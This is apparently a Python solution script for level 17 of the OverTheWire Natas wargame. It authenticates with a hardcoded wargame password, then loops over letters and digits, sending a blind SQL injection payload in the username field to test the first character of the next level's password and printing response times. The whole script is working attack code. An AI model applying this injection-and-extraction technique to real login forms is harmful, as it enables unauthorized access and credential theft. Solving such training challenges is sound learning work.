#!/usr/bin/python3

# coding : utf-8


import requests
import string

pass_charset = string.ascii_letters + string.digits
URL = "http://natas17.natas.labs.overthewire.org"

session = requests.Session()
session.auth = ('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
payload = {'username': ''}

for c in pass_charset:
    payload["username"] = 'natas18 and strcmp(BINARY substr(password, 1, 1), "{}") = 0#'.format(c)
    res = session.post(URL, data=payload)
    print(res.elapsed.total_seconds())

